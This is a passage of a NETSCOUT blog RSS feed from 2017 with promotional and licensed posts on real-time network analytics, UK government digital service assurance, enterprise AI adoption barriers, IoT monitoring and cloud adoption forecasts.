<p>As the discussion moves to real-time applications of BDA for geolocation, connected cars and so on, the use of data lakes to extract timely and actionable information seems a questionable approach that’s unlikely to deliver. Instead, CSPs should look at using a smart analytic feed for real-time BDA use case. Smart data would feed the analytics in real time before the data hits the massive data lakes thus avoiding the need to crunch data from data lakes. To deliver on real-time applications, smart data must be created at the time of capture and not constructed in the data lake.</p>

<p>Network data is the key enabler for digital transformation of service providers as they move to a data centric operating mode. Smart data is network data “refined” for actionable intelligence that powers analytics applications in an agile, real-time environment.”</p>

<p>~John English,&nbsp;Sr. Solutions Marketing Manager, NETSCOUT</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/service-provider">Service Provider</category>
    <enclosure url="http://localhost:7996/sites/default/files/telco_data_analytics.jpg" length="153523" type="image/jpeg"/>
    <guid isPermaLink="false">9c600e65-69a4-43e2-a5d8-7cf239474dd3</guid>
    <pubDate>Mon, 27 Nov 2017 17:11:04 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>John English</dc:creator>
    </item>
<item>
  <title>Running UK Gov Digital Org? </title>
  <link>http://localhost:7996/blog/running-uk-gov-digital-org</link>
  <description>Written by Adam Woolhouse Adam Woolhouse has worked in IT network monitoring and cyber security for 22 years and is now Regional Director at NETSCOUT currently managing the sales team for UK government and the Nordics. Of course, the answer to the title question is that you are, but let’s consider some of the challenges you face. Public expectations for quick and convenient...</description>
  <content:encoded><![CDATA[<div style="background-color: #F5F5F5;margin: 10px 0 20px;padding: 20px;border: 1px solid #DDDDDD;"><img src="https://www.netscout.com/sites/default/files/inline-images/Adam%20Woolhouse_0.JPG" style="float:left;margin-right:15px;" /><strong><em>Written by Adam Woolhouse</em></strong><br />
Adam Woolhouse has worked in IT network monitoring and cyber security for 22 years and is now Regional Director at NETSCOUT currently managing the sales team for UK government and the Nordics.</div>

<p>Of course, the answer to the title question is that you are, but let’s consider some of the challenges you face.</p>

<p>Public expectations for quick and convenient Government services, plus the projected savings of £1.7-1.8B<sup style="vertical-align:super; font-size:smaller">2</sup>, means a digital strategy is an absolute imperative. Going forward, more and more Government business will be digital business. As promised policy roll-outs are beset with delays, the pressing question becomes, how is this new digital business being measured and protected? Any drop-in service level or an attack on Government computers means a loss of government business - either through slower adoption or user delays and a subsequent loss of productivity. No doubt this would hurt the Government brand, leading to questions raised in the House, and offering detractors and naysayers a way of attacking the professionalism of the services affected. To avoid this fate, effective monitoring of these important services, from a service assurance and cyber security perspective, is needed to help mitigate against service outages and performance issues.</p>

<p>So, what is the best way to achieve service assurance and cyber security? In the past, your Systems Integrator (SI) handled much of the service-level monitoring and security of your digital system. This meant you had one port of call whenever any issues with the service levels arose, and the SI’s fortress-like data centers protected your business from attacks - both domestic and foreign. With the demand from Central Government to disaggregate<sup style="vertical-align:super; font-size:smaller">1</sup> these SI contracts, things will no longer be as simple now. As more suppliers offer smaller subsets of the services, UK Government departments and agencies need to have a strategy to monitor the service levels and cyber security across multiple systems and towers, or at the very least, outsource to a supplier who will be dedicated in this role. This will enable a cross-supplier monitoring infrastructure that measures the services and delivers the required business outcomes.</p>

<p><strong>Factoring in the Cloud </strong></p>

<p>Central Government’s Cloud-first Policy<sup style="vertical-align:super; font-size:smaller">3</sup> states that government departments must consider the cloud or demonstrate that the alternative is less expensive. This means that a cyber security and service assurance strategy must be able to monitor both on-premise, cloud and hybrid situations. It is easy to rattle off the benefits from cloud, such as reduced build-out costs, elasticity of resources and rapid provisioning. However, when we surveyed our customers, the top three challenges listed were: security not in an IT organizations control; lack of control over service quality; and performance and lack of visibility throughout the service stack.</p>

<p>It is no secret that there is a lack of skilled cyber security and cross-discipline, level-three technicians available to the UK Government who can hunt down security and performance problems<sup style="vertical-align:super; font-size:smaller">4</sup>. This is a major barrier to digital transformation. Having an overarching strategy for security and service assurance across the digital government estate, instead of relying on different tools for different purposes, is a highly effective way to upskill staff. A good analogy here is when you take your car to the garage to be serviced. Instead of turning to an old-school mechanic, who strictly listen to the sound of the engine to solve the problem, you choose a young, cutting-edge technician, who plugs in a computer to show the error codes. This allows the technician to pin-point the precise problem and quickly make repairs, returning your car to peak performance.</p>

<p><strong>Cyber Security Should be Top of Mind</strong></p>

<p>We have been skirting around the subject of cyber security, but a recent report by the National Audit office<sup style="vertical-align:super; font-size:smaller">5</sup> says that the WannaCry outbreak could have been prevented by taking some simple steps. The office goes on to say, "There are more sophisticated cyber threats out there than&nbsp;WannaCry,&nbsp;so the Department and the NHS need to get their act together to ensure the NHS is better protected against future attacks."</p>

<p>As promising new initiatives are put in place, such as GovWIFI<sup style="vertical-align:super; font-size:smaller">6</sup>, which is designed to improve access and increase productivity, it is vital that these programs be carefully managed, or else risk exposure to another attack vector.</p>

<p>This is where NETSCOUT can make a difference. We help our UK Government customers in several ways. We enable a large NHS organization to manage its network and defend itself against WannaCry with our <a href="https://www.netscout.com/product/enterprise/ngeniusone-service-assurance-platform">nGenius Service Assurance</a> solution. Another large UK agency uses nGenius to monitor and manage its networks and applications. A second large UK agency uses our Smart Data Core to direct traffic for security and performance management from its on-premise, cloud and hybrid cloud to offer a cross-platform and cross-discipline view of its digital business. Analyzing the data using our nGenius service assurance solution turns war rooms into situation rooms. A UK security agency uses the <a href="http://enterprise.netscout.com/enterprise-network/wireless-network/AirMagnet-Enterprise">NETSCOUT AirMagnet</a> solution to secure its WiFi borders, closing down this particular threat vector.</p>

<p>Business Assurance is comprised of Service Assurance and Security Assurance. NETSCOUT’s competitors either focus on performance <em>or</em> security. Relying on <a href="https://www.netscout.com/solutions/smart-data">NETSCOUT’s Smart Data Core</a>, customers can gather data from across their digital business, and across suppliers, whether in-house, in multi-cloud environments or both, leveraging our service and security assurance solutions, nGenius and <a href="https://www.netscout.com/product/arbor-networks-spectrum">Arbor Spectrum</a>, to achieve total business assurance for the UK government digital business. We would like you to look at our solutions and be your partner of choice in this complex and ever-changing environment.</p>

<p>Given all that we have discussed here, it is time to ask yourself again, who is controlling your business? Make sure it is you and that your organization is not vulnerable to attack by an unscrupulous foreign agency or falls victim to misfortune.</p>

<p>For event information: NETSCOUT Digital Transformation in Government Networking, December 5, 2017 in London, England <a href="https://www.netscout.com/events">https://www.netscout.com/events</a></p>

<p><strong>References</strong></p>

<ol>
	<li>The disaggregation of contracts; <a href="https://www.theregister.co.uk/2016/03/22/gov_will_hand_more_it_biz_to_smes/">https://www.theregister.co.uk/2016/03/22/gov_will_hand_more_it_biz_to_smes/</a></li>
	<li>Digital by default - <a href="https://www.gov.uk/government/publications/government-digital-strategy/government-digital-strategy">https://www.gov.uk/government/publications/government-digital-strategy/government-digital-strategy</a></li>
	<li>Cloud First strategy - <a href="https://www.gov.uk/guidance/government-cloud-first-policy">https://www.gov.uk/guidance/government-cloud-first-policy</a></li>
	<li>Lack of trained and skilled staff in UK government - <a href="https://www.theregister.co.uk/2016/11/14/ukgov_has_18k_it_contractors_on_its_books/">https://www.theregister.co.uk/2016/11/14/ukgov_has_18k_it_contractors_on_its_books/</a></li>
	<li>Desire to protect IT assets and therefore business more securely - <a href="https://www.theregister.co.uk/2017/10/27/nhs_could_have_fended_off_wannacry_says_nao_report/">https://www.theregister.co.uk/2017/10/27/nhs_could_have_fended_off_wannacry_says_nao_report/</a></li>
	<li>GovWifi - <a href="https://www.gov.uk/guidance/set-up-govwifi-on-your-infrastructure">https://www.gov.uk/guidance/set-up-govwifi-on-your-infrastructure</a></li>
</ol>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/UK_Govt.jpg" length="111854" type="image/jpeg"/>
    <guid isPermaLink="false">e3d5cb3f-b377-4171-a9cc-a06d5c970ba5</guid>
    <pubDate>Mon, 27 Nov 2017 12:36:06 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>Adam Woolhouse</dc:creator>
    </item>
<item>
  <title>3 Barriers to AI Adoption Across the Enterprise</title>
  <link>http://localhost:7996/blog/3-barriers-ai-adoption-across-enterprise</link>
  <description>A takeaway from this CIO article by a PwC principal and Chief Technologist is that AI is long ways from crossing the chasm but early uses by enterprises demonstrate automation can improve efficiency and productivity. One aspect of automation is software development or scripting that can be prone to human error, creating the need for a 360-degree view of business services and...</description>
  <content:encoded><![CDATA[<p>Recently, I talked with the forward-thinkers and machine learning scientists at the <a href="https://theaisummit.com/sanfrancisco/" target="_blank">AI Summit in San Francisco</a>. How to connect the power of AI to the enterprise is an open question facing all of us, experts and those connecting the experts with business problems. There are so many possible applications, and everyone is trying to get in on the game. At PwC, we estimate <a href="https://www.pwc.com/gx/en/issues/data-and-analytics/publications/artificial-intelligence-study.html" target="_blank">AI will drive global GDP gains of $15 trillion by 2030</a>, but companies are all over the map. In <a href="http://www.pwc.com/gx/en/ceo-agenda/ceosurvey/2017/us" target="_blank">our survey of CEOs</a>, 24% reported they were already using AI, and 21% said AI was a priority, but the rest said they were only aware of or evaluating AI.</p>

<p>What’s slowing companies down from seizing this opportunity? Working with clients and others in the industry, I frequently encounter three barriers to AI adoption: unclear leadership, picking the right problems and access to skills.</p>

<h2><strong>1. Leadership</strong></h2>

<p>When it comes to leadership, the problem is not a shortage of leaders, but too many, with unclear, overlapping responsibilities, which really means no one in the enterprise “owns” AI.</p>

<p>In <a href="https://www.pwc.com/us/en/advisory-services/digital-iq.html" target="_blank">PwC’s Digital IQ</a> study, we’ve asked the question, “What percentage of technology spending is outside the CIO’s budget,” and the number has climbed steadily from 35% to 50% to 68% in our most recent study. There’s no single technology leader in the enterprise anymore.</p>

<p>Every functional area now invests in technology outside the sphere of the CIO: marketing, finance, the product team, sales and others. New roles in the c-suite also make the lines fuzzy, such as when a <a href="https://www.cio.com/article/3085604/cio-role/warning-cdos-can-be-hazardous-to-your-cios-health.html" target="_blank">CDO overlaps or clashes with a CIO</a>. Those leadership conflicts will hamper all of a company’s investments in emerging technology.</p>

<p>When I see stalled investments in emerging tech, it’s because one department raced ahead, or the IT organization adapted too slowly. They need to be in sync to think through data access and management, cybersecurity, regulatory compliance and other issues. And in organizations with many well-established data and analytics teams, somebody in the c-suite needs to bring their AI efforts together.</p>

<h2><strong>2. Picking the right problems to solve</strong></h2>

<p>Clarifying who owns AI is a start, but as soon as that person sits down at their desk, they’ll be faced with dozens of potential AI pilots and applications.</p>

<p>Our <a href="http://pwcartificialintelligence.com/" target="_blank">AI study</a> shows that 67% of business executives see the potential of AI to automate processes and increase efficiency. And 70% agree that AI has the potential to enable humans to concentrate on meaningful work.</p>

<p>However, what that often means is an analytics team – or many diffused analytics teams and innovators – is working on lots of small projects on the fringes of the core business but not on fundamental work that will move the needle. These pilot projects may even push the envelope in machine learning science, but they often fail to get the attention of senior leaders.</p>

<p>Rather than picking projects based on who in the organization asked for help with AI, or based on what algorithms the team knows or what clean, labeled data we have, enterprises should factor in questions about business priorities, such as:</p>

<ul>
	<li>What parts of our business generate a lot of revenue but have lower than desired margins (and therefore could be more automated)?</li>
	<li>What work do our people do that they don’t particularly like?</li>
	<li>Where do we make a high percentage of errors in our work?</li>
</ul>

<p>Exploring these types of questions, coupled with the data and technique driven approach, will yield a more engaged business and maybe more impactful applications of AI.</p>

<h2><strong>3. Skills</strong></h2>

<p>In all but the largest or most data-focused companies, picking projects to work on across the enterprise is often hampered by a shortage of AI brainpower and talent. In <a href="https://www.pwc.com/us/en/advisory-services/digital-iq.html" target="_blank">PwC’s Digital IQ survey</a>, only 20% of executives said their organizations had the skills necessary to succeed with AI.</p>

<p>Companies with many analytics teams spread across different business units and functions often see these teams vary greatly in size, capability and skill level. Some are eager to tackle AI; others are not. Usually, most of the machine learning talent lives in a few teams, but the demand for machine learning skills is growing fast across the organization.</p>

<p>If the company has an executive who “owns AI,” her task is both (1) to help these teams work together, learn from each other and share knowledge; and (2) to add more AI skills to the talent pool. Sometimes that means hiring or acquisitions, and other times it means sourcing innovation from outside the organization. In <a href="https://www.pwc.com/us/en/advisory-services/digital-iq.html" target="_blank">PwC’s Digital IQ survey</a>, only about 43% of companies have a dedicated team for digital innovation.</p>

<p>In an environment where AI talent is scarce and in very high demand, many companies are scouting innovation from third party sources, such as <a href="https://www.pwc.com" target="_blank">university labs</a>, the open source community and hackathons, as well as incubators and accelerators.</p>

<h2><strong>Evolving AI leadership</strong></h2>

<p>Communication is the key. Often, for the machine learning experts and the technologists, the exciting part of AI is the dataset or the algorithm, or the application. But to implement AI across the enterprise, it’s often more useful to talk about automation. In other words, efficiency and the bottom line. Making employees’ jobs easier.</p>

<p>Consider how your AI projects are set up for success by assessing how you are addressing:</p>

<ul>
	<li>Leaders: Identifying energetic people within the organization with excitement, budgets and ownership over AI.</li>
	<li>Problems: Picking projects that extend beyond individual business units and serve the whole enterprise or those explicitly part of corporate or business unit strategies.</li>
	<li>Sourcing: Scouting ideas and talent from inside and outside the organization and sharing lessons and scare expertise.</li>
	<li>Communication: Learning to think and talk about AI within the organization.</li>
</ul>

<p>When it’s time to go beyond small-scale AI pilots, think about the business context surrounding the project, and the whole company can get behind it.</p>

<p>&nbsp;</p>

<p class="nc_attribution_text">This article was written by Chris Curran from <a href="https://www.cio.com/article/3235811/artificial-intelligence/3-barriers-to-ai-adoption-across-the-enterprise.html" target="_blank">CIO</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com" target="_blank">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/AI_b.jpg" length="246675" type="image/jpeg"/>
    <guid isPermaLink="false">b7acb3ed-f72d-49fb-bebb-0c4df7a4d3ec</guid>
    <pubDate>Wed, 22 Nov 2017 17:50:48 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Building an IoT Early Warning System</title>
  <link>http://localhost:7996/blog/building-iot-early-warning-system</link>
  <description>What is one thing cloud computing and the Internet of Things have in common? They both challenge your company’s ability to maintain the level of control IT has worked so hard to master. Using cloud computing to support IoT initiatives makes it that much harder to ensure things are working the way they should, adding further risk to these critical new efforts. The emerging cloud...</description>
  <content:encoded><![CDATA[<p>What is one thing cloud computing and the Internet of Things have in common? They both challenge your company’s ability to maintain the level of control IT&nbsp;has&nbsp;worked&nbsp;so&nbsp;hard to master. Using&nbsp;cloud computing to support IoT initiatives makes&nbsp;it&nbsp;that&nbsp;much harder to ensure things are working the way they should, adding&nbsp;further&nbsp;risk&nbsp;to these critical new efforts.</p>

<p>The emerging cloud-centric, IoT-driven world is characterized by swarms of networked, smart “things” collecting and forwarding high volumes of data to a cloud, where it is correlated and analyzed and used to support new business opportunities.</p>

<p>Given the potential importance of these efforts—<a href="https://hbr.org/2015/10/how-smart-connected-products-are-transforming-companies" target="_blank"><em>Harvard Business Review</em> goes as far as to say IoT is “transforming companies”</a>—you need to understand how services work end-to-end across these multi-domain, hyper-connected, environments in&nbsp;order&nbsp;for IT to get in front of problems involving reliability, availability and performance before they become business problems.</p>

<p>That’s easier said than done given this simple fact: IoT sensors aren’t going to complain to tech support about performance degradations. Things can go soft before they go south, and if you’ve built an important new business initiative on IoT, you might not see the problem before it impacts customer experience or revenue. What’s more, if you use an IoT cloud platform from one of the big hosting companies—say, Amazon, Microsoft, or Google—you’re already an arm’s length away from direct control.</p>

<h2><strong>The Business Impact of IoT Availability&nbsp;and&nbsp;Reliability</strong></h2>

<p>As mightily as we guard against it, downtime happens. Witness the outage this past summer that knocked British Airways’ systems offline, grounding all flights out of the airline’s two major hubs in the United Kingdom.&nbsp;</p>

<p style="text-align: center;"><img alt="departure lounge in modern european airport" height="322" src="https://images3.newscred.com/Zz1iZmE3MjRlZTU2OTA5YzVlN2RiM2M5ZTMzZGE3ODc4YQ==" width="483.00000000000006" /></p>

<p>The outage rippled around the world, eventually stranding some 75,000 passengers. It took four days to normalize operations and get people to where they needed to go. That outage <a href="http://www.express.co.uk/travel/articles/813595/British-Airways-computer-shutdown-human-error" target="_blank">stemmed from human error</a> in a data center after power failed and a contractor restored it too quickly, leading to a surge that damaged servers and other equipment. <a href="http://www.dailymail.co.uk/news/article-4565236/IT-engineer-blame-BA-s-150million-global-meltdown.html" target="_blank">According to some sources,</a> the snafu ended up costing British Airways close to $200 million.</p>

<p>And this example surfaced in a data center that is tightly managed. Compare that to an IoT deployment with resources reporting into a third-party&nbsp;cloud platform. The chance of interrelated problems cropping up is greatly enhanced, as is the chance that IT won’t see service and application performance&nbsp;problems developing and be able to grasp the big-picture implications.</p>

<p style="text-align: center;"><img alt="CNC lathe" height="322" src="https://images1.newscred.com/Zz0xYmExNTgyYjQ4ODU1YTIyNmEyMmIyNzFmNzc5NjI3NA==" width="482.35856573705183" /></p>

<p>Consider the potential downside for a company that sells production tooling to automakers and tracks those CNC machines as an IoT value-add. By tracking machine uptime information, data about parts created, and production timing, the supplier can give customers real-time information about the factory floor environment, which they can then use to optimize operations. Collecting that information paves the way for even more data-intensive service opportunities, such as integration with customer ERP systems to help schedule parts and otherwise streamline production.</p>

<p>In this kind of highly leveraged IoT deployment extending into multiple systems and key operations, the health of IoT resources and strong service&nbsp;performance&nbsp;is business critical. The supplier in question can’t risk losing track of sensors or data and has to ensure services in the cloud are performing as expected, both for the survival of the business and, in the case of heavily regulated industries, compliance reasons.</p>

<h2>But how do you manage these complex IoT environments?</h2>

<p>Many&nbsp;companies&nbsp;use&nbsp;multiple&nbsp;tools&nbsp;to address this IoT challenge, but it takes time to piece together the different components necessary&nbsp;to&nbsp;get&nbsp;a big-picture view—and time is one resource that is always&nbsp;in short supply.</p>

<p>What you need is a top-down approach: a way to ensure the business is operating as it should, using a&nbsp;solution that can assure you that services supporting that business are running correctly. Given the multidimensional aspect of the challenge—remote sensors, local and wide area networks, virtualization,&nbsp;the cloud providers, the applications, the analytics, the&nbsp;cybersecurity&nbsp;posture, etc.—the only real source of truth in this Tower of Babel is traffic on the network.&nbsp;</p>

<p>Traffic-based [or&nbsp;wire&nbsp;data] intelligence can deliver big-picture awareness across complex, converged IT environments, providing insight into apps, service enablers, and the network without the lengthy correlation process required when you’re trying to piece together the truth with narrowly focused tools&nbsp;that only provide a glimpse into their platform or domain and the data itself constrains visibility.&nbsp;</p>

<p>What’s more, focusing on service and&nbsp;security assurance derived from wire data makes it possible to easily and economically scale visibility and intelligent insights along with the infrastructure. After all, IoT initiatives typically start small and, if&nbsp;successful, scale exponentially. That is virtually impossible to do in a cost-effective manner using multiple point tools, especially when you consider that pieces of the service delivery path are within a cloud provider’s domain.</p>

<p>To pinpoint problems before they impact business, continuous monitoring and real-time analytics are needed to understand IoT devices within the context of end-to-end service delivery.</p>

<p>Any other approach is going to be too little, too late, and will ultimately&nbsp;jeopardize critical IoT initiatives.&nbsp;</p>

<p>~Written by John Dix. John is an IT industry veteran who has been chronicling the major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz0xNzliNGJhYmMwODk4MzA4MDRmMDAzMzlhNzk1MjdjOA.jpg" length="712391" type="image/jpeg"/>
    <guid isPermaLink="false">402fa58c-74b6-46f2-b4ce-57612571d4b0</guid>
    <pubDate>Tue, 21 Nov 2017 13:47:53 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>Maintaining IoT Stability When Our Clothes Are Connected</title>
  <link>http://localhost:7996/blog/maintaining-iot-stability-when-our-clothes-are-connected</link>
  <description>The Internet of Things has captured the imagination of companies in a range of industries because it promises everything from new ways to earn customer devotion to opportunities to create new revenue streams. Harvard Business Review goes as far as to say that “the evolution of products into intelligent, connected devices—which are increasingly embedded in broader systems—is...</description>
  <content:encoded><![CDATA[<p>The Internet of Things has captured the imagination of companies in a range of industries because it promises everything from new ways to earn customer devotion to opportunities to create new revenue streams.&nbsp;<em><a href="https://hbr.org/2015/10/how-smart-connected-products-are-transforming-companies" target="_blank">Harvard Business Review</a></em> goes as far as to say that “the evolution of products into intelligent, connected devices—which are increasingly embedded in broader systems—is radically reshaping companies and competition.”</p>

<p>For example,if your products contain sensors capable of sending data to your cloud environment when a vibration or temperature or cycle threshold is exceeded, you can run analytics on the data and notify the customer ahead of&nbsp;time about the need for repair. The upshot? Your customer can swap out the component before it breaks, decreasing downtime and increasing operational efficiency. Predictive maintenance capabilities like that can help you retain business—or if the competition gets there before you do, help put you out of business.</p>

<p>And that is only one simple example of IoT at work. The implications are big, broad, and have the potential to reshape companies. For example, Forrester notes that the advent of autonomous vehicles is likely to transform car companies from hardware manufacturers into high-tech mobility providers.</p>

<p style="text-align: center;"><img alt="undefined" height="322" src="https://images2.newscred.com/Zz1lZDM3NzdkNDU2NWQyYTg1MWIwMTVlMWVjNjIyYTk5OQ==" width="487.0571604179471" /></p>

<h2><strong>The stakes of IoT adoption</strong></h2>

<p>Industry projections about the IoT adoption curve are all over the map, since firms tend to count different things, with some lumping in consumer smart home technologies and others looking specifically at B2B spending. Regarding the latter, the <a href="https://www.bcgperspectives.com/content/articles/hardware-software-energy-environment-winning-in-iot-all-about-winning-processes/" target="_blank">Boston Consulting Group estimates</a> that spending on IoT apps, technologies, and solutions is growing at a 20 percent compound annual growth rate and will reach $276 billion by 2020.</p>

<p>By all accounts, however, we are still in the early days of IoT adoption, with particularly strong interest in industries such as discrete manufacturing, so-called 'smart agriculture'&nbsp;transportation, and the energy sector. And while <a href="https://www.networkworld.com/article/3169384/internet-of-things/storage-tank-operator-turns-to-iot-for-energy-savings.html" target="_blank">some companies are reporting IoT successes</a>, most firms are just beginning to explore their options via small incubator projects.</p>

<p>And that’s a wise move because here’s the rub: It is easy to get excited about the potential of IoT and overlook the simple fact that networking boatloads of new “things” vastly complicates the job of managing those things. If the job of a sensor is to report on the health of a component, what is reporting on the health of the sensor?</p>

<p>If the sensor is one of thousands and your business now swings on the performance and status of those sensors and their cloud-based delivery mechanisms, what’s to keep a service glitch—and there will always be glitches—from resulting in a domino effect across the network, through the data center, and maybe even into the company boardroom?</p>

<p style="text-align: center;"><img alt="Man working in server room" height="322" src="https://images1.newscred.com/Zz1jNDJhZGUwNGVkMmZkNjEyMTg4NjYwYjI0NTZmNzg3OA==" width="429.3057978450487" /></p>

<p>Traditional IT downtime can be costly enough—estimates for one hour of outage range from $100,000 to $5 million—but the stakes will be higher for companies that successfully leverage IoT, given the critical role the technology will play. If you sell customers on the ability to predict the outage of the equipment you supply, what is the cost if and when you miss the warning signs and things go awry? When the technology you counted on to realize a competitive advantage is suddenly pushing customers away?</p>

<h2><strong>A new approach to monitoring business services</strong></h2>

<p>Pervasive visibility into these dynamic, highly integrated environments will be paramount to maintaining stability and keeping customers happy, but it will require some changes to today’s approach.</p>

<p>The tools used today to monitor business services are too silo'ed for emerging IoT requirements. We have security tools, configuration and log analysis tools, cloud platform monitoring tools, and so on. When problems crop up, everyone rushes in with their little view of the world. The great correlation dance starts, as we manually try to piece together a picture of what is going on.</p>

<p>That won’t work in a world of smart, connected devices, all of which are generating voluminous streams of data that are critical to business services. If we are to realize the full potential of IoT to drive new revenue streams and deliver new customer capabilities, then we’re going to need pervasive visibility into everything that is happening across the different IT domains, from the edge to data center and cloud, and a smarter, data-driven way to&nbsp;act upon what we see.</p>

<p>The key is to achieve a holistic understanding of what is happening so we can more quickly identify the root cause of a performance issue—whether it is caused by a DNS look-up failure, a human mistake, or a security threat—investigate it accordingly, resolve the problem, and document it. After all, IoT sensors don’t call tech support when business services break, so we are going to have to use data-driven approaches to fill&nbsp;the gap.&nbsp;The key is to use wire data to create contextual metadata that is ready at speed. Known as smart&nbsp;data, this method generates real-time answers to assure service delivery and security for large, complex environments, which are only going to become larger and more complex with IoT.</p>

<p>How complex? Consider efforts underway to embed sensors in clothing, which <a href="https://www.forbes.com/sites/rachelarthur/2016/04/21/10-billion-items-of-connected-clothing-the-internet-of-things-just-became-a-lot-more-fashionable/#1a563f955f8f" target="_blank">some conclude</a> will lead to some 10 billion items being switched on. Try to correlate that.</p>

<p>~Written by John Dix. John&nbsp;is an IT industry veteran who has been chronicling the major shifts in IT since the emergence of distributed processing in the early ‘80s. An award-winning writer and editor, he was the editor-in-chief for NetworkWorld for many years and an analyst for research firm IDC.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz04OTdiMTczYjNkM2ZmMDM3Mjk0YjhkODk5OTdmNjFkNw.jpg" length="437400" type="image/jpeg"/>
    <guid isPermaLink="false">de18733b-c5d4-4ac6-9efd-894abe7a78f6</guid>
    <pubDate>Tue, 21 Nov 2017 13:17:40 -0500</pubDate>
    <source url="http://localhost:7996/de/full-blogs-2017.xml">NETSCOUT Blogs</source>
    <dc:creator>NETSCOUT</dc:creator>
    </item>
<item>
  <title>90% of Enterprises to Use Cloud Services by 2021</title>
  <link>http://localhost:7996/blog/90-enterprises-use-cloud-services-2021</link>
  <description>Clearly, cloud platforms have become table stakes for digital transformation efforts, as over 90% of companies will use cloud platforms by 2021. But surprisingly, companies are somewhat unlikely to build a comprehensive plan for cloud migration, often lowering cloud's value and ROI. With hybrid cloud the reality for at least the next decade, it makes sense to manage cloud...</description>
  <content:encoded><![CDATA[<p>Over 90 percent of all enterprises will use cloud platforms to innovate and improve agility by 2021. Companies are spending "aggressively" on new technologies as they compete to grow their digital presence and improve customer experiences.</p>

<h2><strong>Data as a service</strong></h2>

<p>Enterprises will spend over $530 billion on cloud services and infrastructure by 2021, according to a new set of industry predictions by analyst IDC. Businesses across every industry will <a href="http://www.digitaljournal.com/tech-and-science/technology/public-cloud-revenue-to-reach-260bn-this-year-due-to-saas-demand/article/504944" target="_blank">move to the cloud</a> as the importance of digital transformation becomes apparent.</p>

<p>Companies are <a href="http://www.digitaljournal.com/tech-and-science/technology/dell-to-invest-1-billion-in-the-internet-of-things/article/504881" target="_blank">restructuring themselves</a> around data and their digital assets. Over 90 percent of enterprises will offer "data-as-a-service" products to generate revenue and extract value from their data lakes.</p>

<p>One way this can be achieved is packaging up data and selling it to developers, consumers and other businesses. This motion will favor firms that are already <a href="http://www.digitaljournal.com/tech-and-science/technology/deutsche-bank-open-sources-its-trading-code/article/504220" target="_blank">making investments in</a> APIs and open platforms.</p>

<h2><strong>Sustaining innovation</strong></h2>

<p>According to IDC, embracing the cloud is no longer an optional step for innovative companies. Looking into the next decade, <a href="http://www.digitaljournal.com/tech-and-science/technology/apple-and-ge-partnership-puts-industrial-iot-on-the-iphone/article/505464" target="_blank">industrial technological</a> breakthroughs will be made in the cloud. Companies that&nbsp;<a href="http://www.digitaljournal.com/tech-and-science/technology/59-of-businesses-find-their-digital-transformation-falls-flat/article/504386" target="_blank">make the most from</a> their data will become leaders in their field, if they <a href="http://www.digitaljournal.com/tech-and-science/technology/cloud-skills-shortage-threatens-digital-transformation/article/503103" target="_blank">have the resources</a> to effectively maintain their infrastructure.</p>

<p>"Adopting the cloud is no longer primarily about economics and agility – it is becoming enterprises' most critical and dependable source of sustained technology innovations," said IDC. "Cloud resource management and integration of resources across multiple cloud platforms will become critical capabilities for IT organizations on their DX [digital transformation] journey."</p>

<h2><strong>Embracing new technologies</strong></h2>

<p>Besides agility and <a href="http://www.digitaljournal.com/tech-and-science/technology/digital-transformation-is-redefining-the-customer-experience/article/504684" target="_blank">customer experience improvements</a>, enterprises are also using cloud platforms to unlock new technologies. Emerging technological fields such as AI, blockchain and digital assistance all demand a robust supporting infrastructure capable of running at scale. Existing on-premises legacy networks often <a href="http://www.digitaljournal.com/tech-and-science/technology/aging-infrastructure-still-impeding-digital-transformation/article/503013" target="_blank">lack the resources</a>&nbsp;necessary to make investment in new tech worthwhile.</p>

<p>Moving to the cloud will give enterprises an opportunity to explore new frontiers of the digital economy. IDC predicted that an "AI war" is on the horizon as more businesses and developers become familiar with the technology.</p>

<p>By 2021, 75 percent of commercial enterprise apps will include AI capabilities, leaving the remaining quarter of businesses technically behind their rivals. In the same period, 25 percent of firms will launch a blockchain-based service to increase trust and security on their cloud platform.</p>

<p>Companies that don't start investing now could be left behind. Organizations may have just three years to make "significant" progress in their <a href="http://www.digitaljournal.com/business/microsoft-says-don-t-fear-digital-transformation/article/506553" style="font-size: 12pt;" target="_blank">digital transformation strategies</a>. Enterprises which fall behind the curve may find themselves locked out of new opportunities and constrained by legacy tech, limiting their innovative capabilities.&nbsp;</p>

<p>&nbsp;</p>

<p class="nc_attribution_text">This article was from <a href="http://newscred.aci.info/view/a023000000A0zqSAAR/15f7dc46cc4000189e91d87/original" target="_blank">Digital Journal</a> and was legally licensed through the <a href="https://www.newscred.com/" target="_blank">NewsCred</a> publisher network. Please direct all licensing questions to <a href="mailto:legal@newscred.com" target="_blank">legal@newscred.com</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/enterprise">Enterprise</category>
    <enclosure url="http://localhost:7996/sites/default/files/2020-01/09/images/Zz05ODFhOTdlZjYyZWQwYTRiZGIxZGFmYTg0MTdkZDYzZQ.jpg" length="809124" type="image/jpeg"/>
    <guid isPermaLink="false">e262bd04-982e-4400-a75a-947b1fb683be</guid>
    <pubDate>Tue, 14 Nov 2017 18:13:09 -0500</pubDate>
